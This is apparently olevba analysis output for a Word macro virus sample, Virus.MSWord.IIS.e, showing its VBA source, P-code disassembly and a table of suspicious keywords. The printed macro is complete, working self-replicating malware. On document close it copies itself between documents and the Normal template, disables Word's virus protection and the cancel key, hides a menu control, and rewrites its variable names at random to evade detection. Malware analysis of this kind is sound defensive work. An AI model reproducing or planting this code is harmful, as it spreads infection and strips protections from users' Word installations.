olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
a = NormalTemplate.VBProject.vbcomponents(1).codemodule.lines(1, 1)
If a = "Private Sub Document_Close()" Then
Set inf = ActiveDocument
Set sour = NormalTemplate
ident = 1
End If
a = ActiveDocument.VBProject.vbcomponents(1).codemodule.lines(1, 1)
If a = "Private Sub Document_Close()" Then
Set inf = NormalTemplate
Set sour = ActiveDocument
ident = ident + 2
End If
If ident = 3 Then Exit Sub
'a
'ident
'inf
'sour
'lin
'b
Application.Options.VirusProtection = False
'vars
'c
'i
'newvar
'e
'ii
'm
't
'h
'ß×ùo´ºê‚
'l
Application.EnableCancelKey = wdCancelDisabled
'iii
'look
'temp
'tempb
Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
'back
'once
Options.SaveNormalPrompt = False
'f
ReDim vars(25, 25)
Do Until e = sour.VBProject.vbcomponents(1).codemodule.countoflines
e = e + 1
lin = sour.VBProject.vbcomponents(1).codemodule.lines(e, 1)
If Left(lin, 1) = "'" Then
b = b + 1
vars(b, 1) = Mid(lin, 2, Len(lin))
Randomize Timer
c = Int(Rnd * 20) + 2
For i = 1 To c
d = Int(Rnd * 74) + 130
newvar = newvar & Chr(d)
Next i
vars(b, 2) = newvar
End If
newvar = ""
Loop
For ii = 1 To 24
m = vars(ii, 2)
For t = ii + 1 To 24
If vars(t, 2) = m Then
ß×ùo´ºê‚ = Int(Rnd * 71) + 130
vars(t, 2) = Chr(ß×ùo´ºê‚)
End If
Next t
For h = 1 To 24
If vars(h, 1) = m Then
ß×ùo´ºê‚ = Int(Rnd * 71) + 130
vars(ii, 2) = Chr(ß×ùo´ºê‚)
m = vars(ii, 2)
End If
Next h
Next ii
b = 1
Do Until b = sour.VBProject.vbcomponents(1).codemodule.countoflines
m = sour.VBProject.vbcomponents(1).codemodule.lines(b, 1)
b = b + 1
l = Len(m)
iii = 0
Do Until iii >= l
iii = iii + 1
c = Mid(m, iii, 1)
If Asc(c) > 64 Then
var = var & Mid(m, iii, 1)
Else
once:
If Len(var) > 0 Then
For look = 1 To 24
If vars(look, 1) = var Then
var = vars(look, 2)
l = Len(vars(look, 1))
If h = 1 Then l = l - 1
temp = Mid(m, 1, iii - l - 1)
l = Len(m)
If h = 1 Then
tempb = ""
Else
tempb = Mid(m, iii, l)
End If
m = temp & var & tempb
l = Len(m)
iii = iii + Len(var) - Len(vars(look, 1))
Exit For
End If
Next look
End If
var = ""
If h = 1 Then
h = 0
GoTo back
End If
End If
Loop
h = 1
GoTo once
back:
f = f & m & Chr(13)
m = ""
Loop
f = f & " End Sub"
inf.VBProject.vbcomponents(1).codemodule.deletelines 1, inf.VBProject.vbcomponents(1).codemodule.countoflines
inf.VBProject.vbcomponents(1).codemodule.addfromstring (f)
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.IIS.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5972 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St a 
' Line #2:
' 	Ld a 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #3:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set inf 
' Line #4:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set sour 
' Line #5:
' 	LitDI2 0x0001 
' 	St ident 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St a 
' Line #8:
' 	Ld a 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set inf 
' Line #10:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set sour 
' Line #11:
' 	Ld ident 
' 	LitDI2 0x0002 
' 	Add 
' 	St ident 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld ident 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #14:
' 	QuoteRem 0x0000 0x0001 "a"
' Line #15:
' 	QuoteRem 0x0000 0x0005 "ident"
' Line #16:
' 	QuoteRem 0x0000 0x0003 "inf"
' Line #17:
' 	QuoteRem 0x0000 0x0004 "sour"
' Line #18:
' 	QuoteRem 0x0000 0x0003 "lin"
' Line #19:
' 	QuoteRem 0x0000 0x0001 "b"
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #21:
' 	QuoteRem 0x0000 0x0004 "vars"
' Line #22:
' 	QuoteRem 0x0000 0x0001 "c"
' Line #23:
' 	QuoteRem 0x0000 0x0001 "i"
' Line #24:
' 	QuoteRem 0x0000 0x0006 "newvar"
' Line #25:
' 	QuoteRem 0x0000 0x0001 "e"
' Line #26:
' 	QuoteRem 0x0000 0x0002 "ii"
' Line #27:
' 	QuoteRem 0x0000 0x0001 "m"
' Line #28:
' 	QuoteRem 0x0000 0x0001 "t"
' Line #29:
' 	QuoteRem 0x0000 0x0001 "h"
' Line #30:
' 	QuoteRem 0x0000 0x0008 "ß×ùo´ºê‚"
' Line #31:
' 	QuoteRem 0x0000 0x0001 "l"
' Line #32:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #33:
' 	QuoteRem 0x0000 0x0003 "iii"
' Line #34:
' 	QuoteRem 0x0000 0x0004 "look"
' Line #35:
' 	QuoteRem 0x0000 0x0004 "temp"
' Line #36:
' 	QuoteRem 0x0000 0x0005 "tempb"
' Line #37:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #38:
' 	QuoteRem 0x0000 0x0004 "back"
' Line #39:
' 	QuoteRem 0x0000 0x0004 "once"
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #41:
' 	QuoteRem 0x0000 0x0001 "f"
' Line #42:
' 	OptionBase 
' 	LitDI2 0x0019 
' 	OptionBase 
' 	LitDI2 0x0019 
' 	Redim vars 0x0002 (As Variant)
' Line #43:
' 	Ld e 
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Eq 
' 	DoUnitil 
' Line #44:
' 	Ld e 
' 	LitDI2 0x0001 
' 	Add 
' 	St e 
' Line #45:
' 	Ld e 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St lin 
' Line #46:
' 	Ld lin 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	IfBlock 
' Line #47:
' 	Ld B 
' 	LitDI2 0x0001 
' 	Add 
' 	St B 
' Line #48:
' 	Ld lin 
' 	LitDI2 0x0002 
' 	Ld lin 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld B 
' 	LitDI2 0x0001 
' 	ArgsSt vars 0x0002 
' Line #49:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #50:
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St c 
' Line #51:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld c 
' 	For 
' Line #52:
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	St d 
' Line #53:
' 	Ld newvar 
' 	Ld d 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St newvar 
' Line #54:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	Ld newvar 
' 	Ld B 
' 	LitDI2 0x0002 
' 	ArgsSt vars 0x0002 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	LitStr 0x0000 ""
' 	St newvar 
' Line #58:
' 	Loop 
' Line #59:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	For 
' Line #60:
' 	Ld ii 
' 	LitDI2 0x0002 
' 	ArgsLd vars 0x0002 
' 	St m 
' Line #61:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	For 
' Line #62:
' 	Ld t 
' 	LitDI2 0x0002 
' 	ArgsLd vars 0x0002 
' 	Ld m 
' 	Eq 
' 	IfBlock 
' Line #63:
' 	Ld Rnd 
' 	LitDI2 0x0047 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	St ß×ùo´ºê‚ 
' Line #64:
' 	Ld ß×ùo´ºê‚ 
' 	ArgsLd Chr 0x0001 
' 	Ld t 
' 	LitDI2 0x0002 
' 	ArgsSt vars 0x0002 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	StartForVariable 
' 	Ld h 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	For 
' Line #68:
' 	Ld h 
' 	LitDI2 0x0001 
' 	ArgsLd vars 0x0002 
' 	Ld m 
' 	Eq 
' 	IfBlock 
' Line #69:
' 	Ld Rnd 
' 	LitDI2 0x0047 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	St ß×ùo´ºê‚ 
' Line #70:
' 	Ld ß×ùo´ºê‚ 
' 	ArgsLd Chr 0x0001 
' 	Ld ii 
' 	LitDI2 0x0002 
' 	ArgsSt vars 0x0002 
' Line #71:
' 	Ld ii 
' 	LitDI2 0x0002 
' 	ArgsLd vars 0x0002 
' 	St m 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld h 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	LitDI2 0x0001 
' 	St B 
' Line #76:
' 	Ld B 
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Eq 
' 	DoUnitil 
' Line #77:
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St m 
' Line #78:
' 	Ld B 
' 	LitDI2 0x0001 
' 	Add 
' 	St B 
' Line #79:
' 	Ld m 
' 	FnLen 
' 	St l 
' Line #80:
' 	LitDI2 0x0000 
' 	St iii 
' Line #81:
' 	Ld iii 
' 	Ld l 
' 	Ge 
' 	DoUnitil 
' Line #82:
' 	Ld iii 
' 	LitDI2 0x0001 
' 	Add 
' 	St iii 
' Line #83:
' 	Ld m 
' 	Ld iii 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St c 
' Line #84:
' 	Ld c 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0040 
' 	Gt 
' 	IfBlock 
' Line #85:
' 	Ld var 
' 	Ld m 
' 	Ld iii 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St var 
' Line #86:
' 	ElseBlock 
' Line #87:
' 	Label once 
' Line #88:
' 	Ld var 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #89:
' 	StartForVariable 
' 	Ld look 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	For 
' Line #90:
' 	Ld look 
' 	LitDI2 0x0001 
' 	ArgsLd vars 0x0002 
' 	Ld var 
' 	Eq 
' 	IfBlock 
' Line #91:
' 	Ld look 
' 	LitDI2 0x0002 
' 	ArgsLd vars 0x0002 
' 	St var 
' Line #92:
' 	Ld look 
' 	LitDI2 0x0001 
' 	ArgsLd vars 0x0002 
' 	FnLen 
' 	St l 
' Line #93:
' 	Ld h 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld l 
' 	LitDI2 0x0001 
' 	Sub 
' 	St l 
' 	EndIf 
' Line #94:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Ld iii 
' 	Ld l 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St temp 
' Line #95:
' 	Ld m 
' 	FnLen 
' 	St l 
' Line #96:
' 	Ld h 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #97:
' 	LitStr 0x0000 ""
' 	St tempb 
' Line #98:
' 	ElseBlock 
' Line #99:
' 	Ld m 
' 	Ld iii 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St tempb 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Ld temp 
' 	Ld var 
' 	Concat 
' 	Ld tempb 
' 	Concat 
' 	St m 
' Line #102:
' 	Ld m 
' 	FnLen 
' 	St l 
' Line #103:
' 	Ld iii 
' 	Ld var 
' 	FnLen 
' 	Add 
' 	Ld look 
' 	LitDI2 0x0001 
' 	ArgsLd vars 0x0002 
' 	FnLen 
' 	Sub 
' 	St iii 
' Line #104:
' 	ExitFor 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Ld look 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	LitStr 0x0000 ""
' 	St var 
' Line #109:
' 	Ld h 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #110:
' 	LitDI2 0x0000 
' 	St h 
' Line #111:
' 	GoTo back 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	Loop 
' Line #115:
' 	LitDI2 0x0001 
' 	St h 
' Line #116:
' 	GoTo once 
' Line #117:
' 	Label back 
' Line #118:
' 	Ld False 
' 	Ld m 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St False 
' Line #119:
' 	LitStr 0x0000 ""
' 	St m 
' Line #120:
' 	Loop 
' Line #121:
' 	Ld False 
' 	LitStr 0x0008 " End Sub"
' 	Concat 
' 	St False 
' Line #122:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld inf 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Ld inf 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #123:
' 	Ld False 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld inf 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #124:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

